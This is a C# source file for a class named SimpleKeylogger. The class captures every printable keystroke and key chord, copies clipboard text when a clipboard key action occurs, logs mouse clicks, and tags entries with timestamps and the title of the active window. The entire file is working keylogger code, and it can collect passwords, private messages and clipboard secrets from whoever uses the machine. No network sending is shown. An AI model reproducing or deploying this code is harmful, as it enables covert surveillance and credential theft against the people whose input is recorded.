using System;
using System.Collections.Generic;
using System.Text;
using gma.System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Globalization;

namespace Klog
{
    public delegate void LogEventDelegate(String s);

    public class SimpleKeylogger : IKeylogger
    {
        ForegroundWindow _fw = new ForegroundWindow();
        LogEventDelegate _logEvent;

        KeyChord _keyChord = new KeyChord();

        public SimpleKeylogger(LogEventDelegate logEvent)
        {
            Debug.Assert(logEvent != null);
            _logEvent = logEvent;

            _keyChord.ClipboardAction += new EventHandler(OnClipboardAction);
        }

        void OnClipboardAction(object sender, EventArgs e)
        {
            String cb = Clipboard.GetText();
            if (!String.IsNullOrEmpty(cb))
            {
                LogEvent(Environment.NewLine + "[Clipboard: "+cb+"]" + Environment.NewLine);
            }
        }


        public void OnKeyDown(object sender, KeyEventArgs e)
        {
            _keyChord.AddKeyDown(e.KeyData);
        }

        public void OnKeyUp(object sender, KeyEventArgs e)
        {
            _keyChord.AddKeyUp(e.KeyData);

            if (_keyChord.Completed)
            {
                String s = _keyChord.ToString();
                if (!String.IsNullOrEmpty(s)) { s += Environment.NewLine; }
                _keyChord.Reopen();

                LogEvent(s);
            }
        }

        void LogEvent(String s)
        {
            if (_logEvent == null) { return; }
            if (String.IsNullOrEmpty(s)) { return; }

            if (_fw.CheckHasChanged())
            {
                String date = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                _logEvent(Environment.NewLine + "--- " + date + " App: " + _fw.Text + Environment.NewLine);
            }

            _logEvent(s);
        }

        public void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (Char.GetUnicodeCategory(e.KeyChar) != UnicodeCategory.Control)
            {
                LogEvent(e.KeyChar.ToString());
            }
        }
 
        public void OnMouseActivity(object sender, MouseEventArgs e)
        {
            String s = MouseEventToString(e);
            if (!String.IsNullOrEmpty(s))
            {
                LogEvent(s);
            }
        }

        static String MouseEventToString(MouseEventArgs e)
        {
            // This is when the button is released
            if (e.Clicks == 0) { return "[Click]"; }
            //if (e.Clicks == 1) { return "[MousePress " + e.Button + "]"; }
            return String.Empty;
        }
    }
}
